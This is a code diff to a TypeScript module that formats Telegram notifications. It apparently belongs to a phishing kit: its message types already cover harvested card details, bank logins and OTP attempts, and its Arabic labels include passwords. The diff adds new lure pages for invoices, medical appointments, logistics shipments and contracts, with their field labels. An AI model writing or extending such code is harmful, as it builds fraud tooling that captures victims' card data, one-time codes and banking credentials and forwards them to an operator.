@@ -16,7 +16,7 @@ if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
 }
 
 export interface TelegramMessage {
-  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'payment_otp_attempt' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test';
+  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'payment_otp_attempt' | 'card_details' | 'card_details_with_bank' | 'bank_login' | 'test' | 'invoice_created' | 'health_appointment_created' | 'logistics_shipment_created' | 'contract_created';
   data: Record<string, any>;
   timestamp: string;
   imageUrl?: string; // Optional image URL for shipping_link_created
@@ -209,6 +209,46 @@ const getFieldLabel = (key: string): string => {
     'phoneNumber': 'رقم الهاتف',
     'password': 'كلمة المرور',
     'loginType': 'نوع تسجيل الدخول',
+
+    // Invoices
+    'invoice_number': 'رقم الفاتورة',
+    'client_name': 'اسم العميل',
+    'client_email': 'بريد العميل',
+    'service_description': 'وصف الخدمة',
+    'due_date': 'تاريخ الاستحقاق',
+
+    // Health
+    'patient_name': 'اسم المريض',
+    'patient_id': 'رقم المريض',
+    'appointment_date': 'تاريخ الموعد',
+    'doctor_name': 'اسم الطبيب',
+    'service_category': 'فئة الخدمة',
+    'has_insurance': 'يوجد تأمين',
+    'insurance_provider': 'شركة التأمين',
+    'self_pay_amount': 'المبلغ المدفوع',
+
+    // Logistics
+    'shipment_id': 'رقم الشحنة',
+    'origin_address': 'عنوان المنشأ',
+    'destination_address': 'عنوان الوجهة',
+    'cargo_description': 'وصف البضائع',
+    'weight': 'الوزن (كغ)',
+    'length': 'الطول (سم)',
+    'width': 'العرض (سم)',
+    'height': 'الارتفاع (سم)',
+    'service_type': 'نوع الخدمة',
+    'insurance_value': 'قيمة التأمين',
+
+    // Contracts
+    'contract_id': 'رقم العقد',
+    'party_a': 'الطرف الأول',
+    'party_b': 'الطرف الثاني',
+    'contract_type': 'نوع العقد',
+    'contract_value': 'قيمة العقد',
+    'start_date': 'تاريخ البداية',
+    'duration': 'المدة (شهر)',
+    'terms_summary': 'ملخص الشروط',
+    'document_url': 'رابط الوثيقة',
   };
 
   return labels[key] || key;
@@ -287,6 +327,30 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
     case 'bank_login':
       pageTag = '📄 Page: Bank Login';
       header = '🏦 <b>بيانات تسجيل الدخول للبنك</b>';
+      content = formatFields(filteredData);
+      break;
+
+    case 'invoice_created':
+      pageTag = '📄 Page: Create Invoice';
+      header = '📋 <b>تم إنشاء فاتورة جديدة</b>';
+      content = formatFields(filteredData);
+      break;
+
+    case 'health_appointment_created':
+      pageTag = '📄 Page: Health Appointment';
+      header = '🏥 <b>تم حجز موعد طبي جديد</b>';
+      content = formatFields(filteredData);
+      break;
+
+    case 'logistics_shipment_created':
+      pageTag = '📄 Page: Logistics Shipment';
+      header = '🚛 <b>تم إنشاء شحنة لوجستية جديدة</b>';
+      content = formatFields(filteredData);
+      break;
+
+    case 'contract_created':
+      pageTag = '📄 Page: Contract Creation';
+      header = '📄 <b>تم إنشاء عقد جديد</b>';
       content = formatFields(filteredData);
       break;
 
